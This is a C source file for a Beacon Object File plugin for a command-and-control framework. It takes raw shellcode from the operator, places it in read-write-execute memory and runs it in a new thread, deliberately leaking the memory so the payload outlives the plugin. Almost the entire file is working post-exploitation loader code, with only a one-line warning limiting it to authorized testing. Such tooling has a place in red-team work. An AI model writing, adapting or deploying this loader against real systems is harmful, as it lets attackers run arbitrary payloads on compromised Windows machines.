/*
 * shellcode_exec.c - Shellcode execution BOF plugin.
 *
 * Allocates RWX memory, copies shellcode, and executes in new thread.
 * Memory is intentionally leaked to keep shellcode alive after BOF returns.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec.c -o shellcode_exec.o
 *
 * Usage from server:
 *   Upload shellcode_exec.o, set args = raw shellcode bytes
 *
 * WARNING: This is for authorized security testing only.
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define PAGE_EXECUTE_READWRITE_VAL 0x40

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    /* Parse shellcode from Beacon args (format: 2-byte len + raw bytes) */
    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate RWX memory - intentionally leaked to keep shellcode alive */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        BeaconOutput(CALLBACK_ERROR, "VirtualAlloc failed\n", 20);
        return;
    }

    /* Copy shellcode to executable memory */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);

    /* Create thread - handle is closed but thread continues running */
    HANDLE hThread = KERNEL32$CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        BeaconOutput(CALLBACK_ERROR, "CreateThread failed\n", 20);
        /* Don't free exec_mem - let it leak rather than crash */
        return;
    }

    /* Close handle immediately - thread continues running independently */
    KERNEL32$CloseHandle(hThread);

    /* Memory is intentionally leaked - shellcode needs it to stay alive */
    /* This is necessary because BOF returns immediately */
    BeaconOutput(CALLBACK_OUTPUT, "Shellcode thread started\n", 25);
}
